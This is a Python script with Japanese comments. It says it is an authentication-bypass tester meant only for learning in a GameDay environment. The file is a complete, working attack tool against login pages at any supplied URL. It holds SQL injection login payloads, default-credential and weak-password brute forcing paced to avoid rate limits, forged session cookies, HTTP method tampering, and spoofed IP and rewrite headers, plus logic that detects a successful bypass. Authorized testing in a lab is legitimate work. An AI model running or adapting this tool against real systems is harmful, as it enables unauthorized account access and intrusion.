#!/usr/bin/env python3
"""
認証バイパス脆弱性テストスクリプト
GameDay環境での学習目的のみに使用
"""

import requests
import argparse
import json
import logging
import time
from datetime import datetime
from typing import List, Dict, Any, Optional
import urllib.parse
import sys
import os
import base64
import hashlib

# ログ設定
def setup_logging(log_level: str = "INFO") -> logging.Logger:
    """ログ設定を初期化"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{log_dir}/auth_bypass_{timestamp}.log"
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info(f"ログファイル: {log_file}")
    return logger

class AuthBypassTester:
    """認証バイパス脆弱性テスター"""
    
    def __init__(self, base_url: str, logger: logging.Logger):
        self.base_url = base_url.rstrip('/')
        self.logger = logger
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GameDay-AuthBypass-Tester/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # 認証バイパスペイロード
        self.bypass_payloads = {
            'sql_injection': [
                "admin' OR '1'='1",
                "admin' OR 1=1--",
                "admin' OR 1=1#",
                "admin'/*",
                "' OR 'x'='x",
                "' OR 1=1 LIMIT 1--",
                "') OR ('1'='1",
                "admin' AND '1'='1",
                "' UNION SELECT 1,1,'admin','admin'--"
            ],
            'default_credentials': [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('root', 'root'),
                ('root', 'password'),
                ('administrator', 'administrator'),
                ('user', 'user'),
                ('guest', 'guest'),
                ('test', 'test'),
                ('demo', 'demo'),
                ('admin', ''),
                ('', 'admin'),
                ('', '')
            ],
            'parameter_pollution': [
                {'username': ['admin', 'guest'], 'password': 'admin'},
                {'username': 'admin', 'password': ['admin', 'wrong']},
                {'username[]': 'admin', 'password': 'admin'},
                {'username': 'admin', 'password[]': 'admin'}
            ],
            'session_manipulation': [
                {'admin': 'true'},
                {'authenticated': 'true'},
                {'logged_in': 'true'},
                {'user_id': '1'},
                {'role': 'admin'},
                {'is_admin': '1'},
                {'auth': 'true'},
                {'login': 'success'}
            ]
        }
        
        # 弱いパスワードリスト
        self.weak_passwords = [
            'password', '123456', '12345678', 'qwerty', 'abc123',
            'password123', 'admin', 'letmein', 'welcome', 'monkey',
            'dragon', 'master', 'shadow', 'superman', 'michael',
            'football', 'baseball', 'liverpool', 'jordan', 'harley'
        ]
        
        # 一般的なユーザー名
        self.common_usernames = [
            'admin', 'administrator', 'root', 'user', 'guest',
            'test', 'demo', 'sa', 'operator', 'manager',
            'support', 'service', 'system', 'webmaster', 'postmaster'
        ]
        
        # 認証成功の指標
        self.success_indicators = [
            'welcome', 'dashboard', 'profile', 'logout', 'admin panel',
            'logged in', 'authentication successful', 'login successful',
            'home page', 'user panel', 'control panel', 'settings'
        ]
        
        # 認証失敗の指標
        self.failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'denied',
            'unauthorized', 'forbidden', 'wrong', 'bad credentials',
            'login failed', 'authentication failed', 'access denied'
        ]
    
    def test_sql_injection_bypass(self, login_endpoint: str = "/login") -> List[Dict[str, Any]]:
        """SQLインジェクションによる認証バイパステスト"""
        self.logger.info(f"SQLインジェクション認証バイパステスト開始: {login_endpoint}")
        results = []
        
        url = f"{self.base_url}{login_endpoint}"
        
        for payload in self.bypass_payloads['sql_injection']:
            self.logger.info(f"SQLインジェクションペイロード '{payload}' のテスト中...")
            
            # ユーザー名フィールドにペイロード
            result = self._test_login_attempt(
                url,
                payload,
                'password',
                test_type='sql_injection_username',
                payload_info=payload
            )
            results.append(result)
            
            # パスワードフィールドにペイロード
            result = self._test_login_attempt(
                url,
                'admin',
                payload,
                test_type='sql_injection_password',
                payload_info=payload
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def test_default_credentials(self, login_endpoint: str = "/login") -> List[Dict[str, Any]]:
        """デフォルト認証情報テスト"""
        self.logger.info(f"デフォルト認証情報テスト開始: {login_endpoint}")
        results = []
        
        url = f"{self.base_url}{login_endpoint}"
        
        for username, password in self.bypass_payloads['default_credentials']:
            self.logger.info(f"認証情報 '{username}:{password}' のテスト中...")
            
            result = self._test_login_attempt(
                url,
                username,
                password,
                test_type='default_credentials',
                payload_info=f"{username}:{password}"
            )
            results.append(result)
            
            time.sleep(0.3)
        
        return results
    
    def test_brute_force_attack(self, login_endpoint: str = "/login", target_username: str = "admin") -> List[Dict[str, Any]]:
        """ブルートフォース攻撃テスト"""
        self.logger.info(f"ブルートフォース攻撃テスト開始: {login_endpoint}")
        results = []
        
        url = f"{self.base_url}{login_endpoint}"
        
        for password in self.weak_passwords:
            self.logger.info(f"パスワード '{password}' のテスト中...")
            
            result = self._test_login_attempt(
                url,
                target_username,
                password,
                test_type='brute_force',
                payload_info=f"{target_username}:{password}"
            )
            results.append(result)
            
            # レート制限を避けるため少し長めに待機
            time.sleep(1.0)
            
            # 成功した場合は停止
            if result['bypass_successful']:
                self.logger.info("ブルートフォース攻撃成功、テスト停止")
                break
        
        return results
    
    def test_parameter_pollution(self, login_endpoint: str = "/login") -> List[Dict[str, Any]]:
        """パラメータ汚染攻撃テスト"""
        self.logger.info(f"パラメータ汚染攻撃テスト開始: {login_endpoint}")
        results = []
        
        url = f"{self.base_url}{login_endpoint}"
        
        for i, params in enumerate(self.bypass_payloads['parameter_pollution']):
            self.logger.info(f"パラメータ汚染パターン {i+1} のテスト中...")
            
            result = self._test_parameter_pollution(
                url,
                params,
                test_type='parameter_pollution',
                payload_info=f"pattern_{i+1}"
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def test_session_manipulation(self, protected_endpoint: str = "/admin") -> List[Dict[str, Any]]:
        """セッション操作攻撃テスト"""
        self.logger.info(f"セッション操作攻撃テスト開始: {protected_endpoint}")
        results = []
        
        url = f"{self.base_url}{protected_endpoint}"
        
        for session_data in self.bypass_payloads['session_manipulation']:
            self.logger.info(f"セッションデータ '{session_data}' のテスト中...")
            
            result = self._test_session_manipulation(
                url,
                session_data,
                test_type='session_manipulation',
                payload_info=str(session_data)
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def test_http_method_bypass(self, protected_endpoint: str = "/admin") -> List[Dict[str, Any]]:
        """HTTPメソッドバイパステスト"""
        self.logger.info(f"HTTPメソッドバイパステスト開始: {protected_endpoint}")
        results = []
        
        url = f"{self.base_url}{protected_endpoint}"
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        
        for method in methods:
            self.logger.info(f"HTTPメソッド '{method}' のテスト中...")
            
            result = self._test_http_method(
                url,
                method,
                test_type='http_method_bypass',
                payload_info=method
            )
            results.append(result)
            
            time.sleep(0.3)
        
        return results
    
    def test_header_injection(self, protected_endpoint: str = "/admin") -> List[Dict[str, Any]]:
        """ヘッダーインジェクション攻撃テスト"""
        self.logger.info(f"ヘッダーインジェクション攻撃テスト開始: {protected_endpoint}")
        results = []
        
        url = f"{self.base_url}{protected_endpoint}"
        
        # 認証バイパス用ヘッダー
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Original-URL': '/admin'},
            {'X-Override-URL': '/admin'},
            {'Authorization': 'Bearer admin'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
            {'X-User-ID': '1'},
            {'X-User-Role': 'admin'},
            {'X-Authenticated': 'true'},
            {'X-Admin': 'true'}
        ]
        
        for headers in bypass_headers:
            header_name = list(headers.keys())[0]
            self.logger.info(f"ヘッダー '{header_name}' のテスト中...")
            
            result = self._test_header_injection(
                url,
                headers,
                test_type='header_injection',
                payload_info=f"{header_name}:{headers[header_name]}"
            )
            results.append(result)
            
            time.sleep(0.3)
        
        return results
    
    def _test_login_attempt(self, url: str, username: str, password: str, 
                          test_type: str = '', payload_info: str = '') -> Dict[str, Any]:
        """単一ログイン試行テスト"""
        start_time = time.time()
        
        try:
            # ログインデータ
            login_data = {
                'username': username,
                'password': password,
                'login': 'Login',
                'submit': 'Submit'
            }
            
            # ログイン試行
            response = self.session.post(url, data=login_data, timeout=10, allow_redirects=True)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # 認証バイパス成功の判定
            bypass_analysis = self._analyze_auth_response(response)
            
            result = {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'bypass_successful': bypass_analysis['bypass_successful'],
                'evidence': bypass_analysis['evidence'],
                'redirect_url': response.url if response.url != url else '',
                'timestamp': datetime.now().isoformat()
            }
            
            if bypass_analysis['bypass_successful']:
                self.logger.warning(f"認証バイパス成功: {test_type} - {payload_info}")
                self.logger.warning(f"証拠: {bypass_analysis['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            self.logger.error(f"ログイン試行失敗: {str(e)}")
            
            return {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'username': username,
                'password': password,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'bypass_successful': False,
                'evidence': f'Request failed: {str(e)}',
                'redirect_url': '',
                'timestamp': datetime.now().isoformat()
            }
    
    def _test_parameter_pollution(self, url: str, params: Dict, 
                                test_type: str = '', payload_info: str = '') -> Dict[str, Any]:
        """パラメータ汚染テスト"""
        start_time = time.time()
        
        try:
            # パラメータ汚染データの準備
            data = {}
            for key, value in params.items():
                if isinstance(value, list):
                    # 複数の値を同じキーで送信
                    data[key] = value
                else:
                    data[key] = value
            
            # リクエスト送信
            response = self.session.post(url, data=data, timeout=10, allow_redirects=True)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # 認証バイパス成功の判定
            bypass_analysis = self._analyze_auth_response(response)
            
            result = {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'parameters': params,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'bypass_successful': bypass_analysis['bypass_successful'],
                'evidence': bypass_analysis['evidence'],
                'redirect_url': response.url if response.url != url else '',
                'timestamp': datetime.now().isoformat()
            }
            
            if bypass_analysis['bypass_successful']:
                self.logger.warning(f"パラメータ汚染バイパス成功: {payload_info}")
                self.logger.warning(f"証拠: {bypass_analysis['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            return {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'parameters': params,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'bypass_successful': False,
                'evidence': f'Request failed: {str(e)}',
                'redirect_url': '',
                'timestamp': datetime.now().isoformat()
            }
    
    def _test_session_manipulation(self, url: str, session_data: Dict, 
                                 test_type: str = '', payload_info: str = '') -> Dict[str, Any]:
        """セッション操作テスト"""
        start_time = time.time()
        
        try:
            # 新しいセッションを作成
            test_session = requests.Session()
            test_session.headers.update(self.session.headers)
            
            # セッションデータを設定
            for key, value in session_data.items():
                test_session.cookies.set(key, value)
            
            # 保護されたページにアクセス
            response = test_session.get(url, timeout=10, allow_redirects=True)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # 認証バイパス成功の判定
            bypass_analysis = self._analyze_auth_response(response)
            
            result = {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'session_data': session_data,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'bypass_successful': bypass_analysis['bypass_successful'],
                'evidence': bypass_analysis['evidence'],
                'redirect_url': response.url if response.url != url else '',
                'timestamp': datetime.now().isoformat()
            }
            
            if bypass_analysis['bypass_successful']:
                self.logger.warning(f"セッション操作バイパス成功: {payload_info}")
                self.logger.warning(f"証拠: {bypass_analysis['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            return {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'session_data': session_data,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'bypass_successful': False,
                'evidence': f'Request failed: {str(e)}',
                'redirect_url': '',
                'timestamp': datetime.now().isoformat()
            }
    
    def _test_http_method(self, url: str, method: str, 
                        test_type: str = '', payload_info: str = '') -> Dict[str, Any]:
        """HTTPメソッドテスト"""
        start_time = time.time()
        
        try:
            # HTTPメソッドでリクエスト
            response = self.session.request(method, url, timeout=10, allow_redirects=True)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # 認証バイパス成功の判定
            bypass_analysis = self._analyze_auth_response(response)
            
            result = {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'http_method': method,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'bypass_successful': bypass_analysis['bypass_successful'],
                'evidence': bypass_analysis['evidence'],
                'redirect_url': response.url if response.url != url else '',
                'timestamp': datetime.now().isoformat()
            }
            
            if bypass_analysis['bypass_successful']:
                self.logger.warning(f"HTTPメソッドバイパス成功: {method}")
                self.logger.warning(f"証拠: {bypass_analysis['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            return {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'http_method': method,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'bypass_successful': False,
                'evidence': f'Request failed: {str(e)}',
                'redirect_url': '',
                'timestamp': datetime.now().isoformat()
            }
    
    def _test_header_injection(self, url: str, headers: Dict, 
                             test_type: str = '', payload_info: str = '') -> Dict[str, Any]:
        """ヘッダーインジェクションテスト"""
        start_time = time.time()
        
        try:
            # カスタムヘッダーでリクエスト
            response = self.session.get(url, headers=headers, timeout=10, allow_redirects=True)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # 認証バイパス成功の判定
            bypass_analysis = self._analyze_auth_response(response)
            
            result = {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'headers': headers,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'bypass_successful': bypass_analysis['bypass_successful'],
                'evidence': bypass_analysis['evidence'],
                'redirect_url': response.url if response.url != url else '',
                'timestamp': datetime.now().isoformat()
            }
            
            if bypass_analysis['bypass_successful']:
                self.logger.warning(f"ヘッダーインジェクションバイパス成功: {payload_info}")
                self.logger.warning(f"証拠: {bypass_analysis['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            return {
                'url': url,
                'test_type': test_type,
                'payload_info': payload_info,
                'headers': headers,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'bypass_successful': False,
                'evidence': f'Request failed: {str(e)}',
                'redirect_url': '',
                'timestamp': datetime.now().isoformat()
            }
    
    def _analyze_auth_response(self, response: requests.Response) -> Dict[str, Any]:
        """認証レスポンスの分析"""
        response_text = response.text.lower()
        
        # 成功指標の確認
        success_found = []
        for indicator in self.success_indicators:
            if indicator.lower() in response_text:
                success_found.append(indicator)
        
        # 失敗指標の確認
        failure_found = []
        for indicator in self.failure_indicators:
            if indicator.lower() in response_text:
                failure_found.append(indicator)
        
        # ステータスコードによる判定
        if response.status_code == 200 and success_found and not failure_found:
            return {
                'bypass_successful': True,
                'evidence': f'成功指標検出: {", ".join(success_found)}'
            }
        
        # リダイレクトによる判定
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '').lower()
            if any(path in location for path in ['/dashboard', '/admin', '/home', '/profile']):
                return {
                    'bypass_successful': True,
                    'evidence': f'認証成功リダイレクト: {location}'
                }
        
        # 認証が必要なコンテンツの検出
        protected_content = [
            'admin panel', 'control panel', 'user dashboard',
            'logout', 'settings', 'profile', 'account'
        ]
        
        content_found = []
        for content in protected_content:
            if content in response_text:
                content_found.append(content)
        
        if content_found and response.status_code == 200:
            return {
                'bypass_successful': True,
                'evidence': f'保護されたコンテンツにアクセス: {", ".join(content_found)}'
            }
        
        # 失敗の判定
        if failure_found or response.status_code in [401, 403]:
            return {
                'bypass_successful': False,
                'evidence': f'認証失敗: {", ".join(failure_found) if failure_found else "HTTP " + str(response.status_code)}'
            }
        
        # 不明な場合
        return {
            'bypass_successful': False,
            'evidence': f'判定不能: HTTP {response.status_code}'
        }
    
    def generate_report(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """テスト結果のレポート生成"""
        total_tests = len(results)
        successful_bypasses = [r for r in results if r['bypass_successful']]
        
        test_type_summary = {}
        for result in results:
            test_type = result['test_type']
            if test_type not in test_type_summary:
                test_type_summary[test_type] = {'total': 0, 'successful': 0}
            
            test_type_summary[test_type]['total'] += 1
            if result['bypass_successful']:
                test_type_summary[test_type]['successful'] += 1
        
        # 成功率の計算
        for test_type in test_type_summary:
            total = test_type_summary[test_type]['total']
            successful = test_type_summary[test_type]['successful']
            test_type_summary[test_type]['success_rate'] = (successful / total * 100) if total > 0 else 0
        
        report = {
            'target_url': self.base_url,
            'test_summary': {
                'total_tests': total_tests,
                'successful_bypasses': len(successful_bypasses),
                'bypass_success_rate': (len(successful_bypasses) / total_tests * 100) if total_tests > 0 else 0
            },
            'test_type_summary': test_type_summary,
            'critical_findings': [
                result for result in successful_bypasses
                if result['test_type'] in ['sql_injection_username', 'sql_injection_password', 'default_credentials']
            ],
            'test_timestamp': datetime.now().isoformat(),
            'detailed_results': results
        }
        
        return report

def main():
    """メイン関数"""
    parser = argparse.ArgumentParser(description='認証バイパス脆弱性テスト')
    parser.add_argument('-u', '--url', required=True, help='ターゲットベースURL')
    parser.add_argument('-l', '--login-endpoint', default='/login', help='ログインエンドポイント')
    parser.add_argument('-p', '--protected-endpoint', default='/admin', help='保護されたエンドポイント')
    parser.add_argument('-t', '--test-type', 
                       choices=['sql', 'default', 'brute', 'param', 'session', 'method', 'header', 'all'], 
                       default='all', help='テストタイプ')
    parser.add_argument('--target-username', default='admin', help='ブルートフォース対象ユーザー名')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='ログレベル')
    parser.add_argument('--output', help='結果出力ファイル（JSON形式）')
    
    args = parser.parse_args()
    
    # ログ設定
    logger = setup_logging(args.log_level)
    
    # テスター初期化
    tester = AuthBypassTester(args.url, logger)
    
    # テスト実行
    try:
        all_results = []
        
        if args.test_type in ['sql', 'all']:
            results = tester.test_sql_injection_bypass(args.login_endpoint)
            all_results.extend(results)
        
        if args.test_type in ['default', 'all']:
            results = tester.test_default_credentials(args.login_endpoint)
            all_results.extend(results)
        
        if args.test_type in ['brute', 'all']:
            results = tester.test_brute_force_attack(args.login_endpoint, args.target_username)
            all_results.extend(results)
        
        if args.test_type in ['param', 'all']:
            results = tester.test_parameter_pollution(args.login_endpoint)
            all_results.extend(results)
        
        if args.test_type in ['session', 'all']:
            results = tester.test_session_manipulation(args.protected_endpoint)
            all_results.extend(results)
        
        if args.test_type in ['method', 'all']:
            results = tester.test_http_method_bypass(args.protected_endpoint)
            all_results.extend(results)
        
        if args.test_type in ['header', 'all']:
            results = tester.test_header_injection(args.protected_endpoint)
            all_results.extend(results)
        
        # レポート生成
        report = tester.generate_report(all_results)
        
        # 結果表示
        logger.info("=== 認証バイパス脆弱性テスト結果 ===")
        logger.info(f"総テスト数: {report['test_summary']['total_tests']}")
        logger.info(f"バイパス成功数: {report['test_summary']['successful_bypasses']}")
        logger.info(f"バイパス成功率: {report['test_summary']['bypass_success_rate']:.2f}%")
        
        if report['test_type_summary']:
            logger.info("テストタイプ別結果:")
            for test_type, summary in report['test_type_summary'].items():
                logger.info(f"  {test_type}: {summary['successful']}/{summary['total']} ({summary['success_rate']:.1f}%)")
        
        if report['critical_findings']:
            logger.warning(f"重大な脆弱性: {len(report['critical_findings'])}件")
        
        # 結果をファイルに保存
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            logger.info(f"結果をファイルに保存: {args.output}")
    
    except Exception as e:
        logger.error(f"テスト実行中にエラーが発生: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())